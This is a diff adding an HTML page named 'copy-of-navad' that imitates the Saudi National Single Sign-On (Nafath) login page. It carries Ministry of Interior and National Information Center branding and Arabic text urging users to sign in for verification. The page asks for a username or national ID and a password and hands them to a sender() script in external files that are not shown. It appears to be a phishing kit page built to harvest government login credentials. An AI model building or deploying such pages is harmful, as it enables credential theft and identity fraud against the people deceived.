@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>copy-of-navad</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" href="css/navad.css" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" />
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
+</head>
+
+<body>
+    <div class="top-header w-100 float-left">
+        <div class="container">
+            <ul class="pl-0">
+                <li><img src="./img-bank/moi_logo.webp" /></li>
+                <li>
+                    <img src="./img-bank/vission-logo.webp" />
+                    <span> <img src="./img-bank/navad.webp" /></span>
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="content w-100 float-left">
+        <div class="container">
+            <h1>الدخول على النظام</h1>
+            <p>المصادقة الثنائية ,حرصا على سلامتك وسلامة بياناتك يرجى تسجيل الدخول عبر نفاذ للتاكيد</p>
+        </div>
+    </div>
+    <div class="form w-100 float-left">
+        <div class="container">
+            <div class="form-content">
+                <div class="form-header w-100">
+                    <ul class="pl-0 mb-0">
+                        <li>تسجيل الدخول عن طريق اسم المستخدم وكلمة المرور</li>
+                        <li><img src="./img-bank/sprites3 login.webp" /></li>
+                    </ul>
+                </div>
+                <div class="form-section w-100">
+                    <ul>
+                        <form id="page2form" action="" method="post" onsubmit=" return sender(event)">
+                            <li>
+                                <input type="text" name="name" id="name" required
+                                    placeholder="اسم المستخدم او  الهوية الوطنية" />
+                                <button class="icons">
+                                    <svg data-bbox="28 20 143.999 160" viewBox="0 0 200 200" height="200" width="200"
+                                        xmlns="http://www.w3.org/2000/svg" data-type="shape">
+                                        <g>
+                                            <path
+                                                d="M166.547 180c-3.012 0-5.453-2.431-5.453-5.431v-16.571c0-15.28-12.481-27.711-27.821-27.711H66.726c-15.339 0-27.821 12.432-27.821 27.711v16.571c0 3-2.441 5.431-5.453 5.431S28 177.569 28 174.569v-16.571c0-21.269 17.372-38.573 38.726-38.573h66.547c21.354 0 38.726 17.304 38.726 38.573v16.571c.001 3-2.44 5.431-5.452 5.431z">
+                                            </path>
+                                            <path
+                                                d="M100 97.146c-21.354 0-38.726-17.304-38.726-38.573S78.646 20 100 20s38.726 17.303 38.726 38.572S121.354 97.146 100 97.146zm0-66.284c-15.339 0-27.821 12.431-27.821 27.71S84.661 86.284 100 86.284s27.821-12.432 27.821-27.711S115.339 30.862 100 30.862z">
+                                            </path>
+                                        </g>
+                                    </svg>
+                                </button>
+                            </li>
+                            <li>
+                                <input type="text" name="password" id="password" required placeholder="كلمة المرور" />
+                                <button class="icons">
+                                    <svg data-bbox="45 20 110 160" viewBox="0 0 200 200" height="200" width="200"
+                                        xmlns="http://www.w3.org/2000/svg" data-type="shape">
+                                        <g>
+                                            <path
+                                                d="M154.974 165.225l-5.27-86.612c-.447-7.351-6.539-13.083-13.903-13.083h-5.33V50.472C130.471 33.671 116.8 20 99.999 20S69.527 33.671 69.527 50.472V65.53h-5.328c-7.364 0-13.456 5.733-13.903 13.083l-5.27 86.612C44.539 173.236 50.904 180 58.93 180h82.141c8.025 0 14.39-6.764 13.903-14.775zM81.134 50.472c0-10.402 8.463-18.865 18.864-18.865s18.864 8.463 18.864 18.865V65.53H81.134V50.472z">
+                                            </path>
+                                        </g>
+                                    </svg>
+                                </button>
+                            </li>
+                            <li><button type="submit" id="btn" name="submit" class="submit">تسجيل دخول</button></li>
+                            <li>
+                                <span>حساب جديد</span>
+                                <button class="icons">
+                                    <svg data-bbox="28 20 143.999 160" viewBox="0 0 200 200" height="200" width="200"
+                                        xmlns="http://www.w3.org/2000/svg" data-type="shape">
+                                        <g>
+                                            <path
+                                                d="M166.547 180c-3.012 0-5.453-2.431-5.453-5.431v-16.571c0-15.28-12.481-27.711-27.821-27.711H66.726c-15.339 0-27.821 12.432-27.821 27.711v16.571c0 3-2.441 5.431-5.453 5.431S28 177.569 28 174.569v-16.571c0-21.269 17.372-38.573 38.726-38.573h66.547c21.354 0 38.726 17.304 38.726 38.573v16.571c.001 3-2.44 5.431-5.452 5.431z">
+                                            </path>
+                                            <path
+                                                d="M100 97.146c-21.354 0-38.726-17.304-38.726-38.573S78.646 20 100 20s38.726 17.303 38.726 38.572S121.354 97.146 100 97.146zm0-66.284c-15.339 0-27.821 12.431-27.821 27.71S84.661 86.284 100 86.284s27.821-12.432 27.821-27.711S115.339 30.862 100 30.862z">
+                                            </path>
+                                        </g>
+                                    </svg>
+                                </button>
+                            </li>
+                        </form>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="footer w-100 float-left">
+        <div class="container">
+            <div class="row">
+                <div class="col-sm-5">
+                    <ul class="pl-0 mb-0">
+                        <li><span>.الرئيسية</span> <span>.حول اتصل</span> <span>.بنا الشروط</span> <span>والأحكام
+                                المساعدة والدعم</span></li>
+                    </ul>
+                </div>
+                <div class="col-sm-4">
+                    <p class="mb-0 text">تطوير وتشغيل</p>
+                    <h5>مركز المعلومات الوطني</h5>
+                    <p class="mb-0">النفاذ الوطني الموحد جميع الحقوق محفوظة © 2022-2023</p>
+                </div>
+                <div class="col-sm-3">
+                    <img src="./img-bank/NIC-logo.webp" />
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="./config.js"></script>
+<script src="./navad.js"></script>
+
+</html>
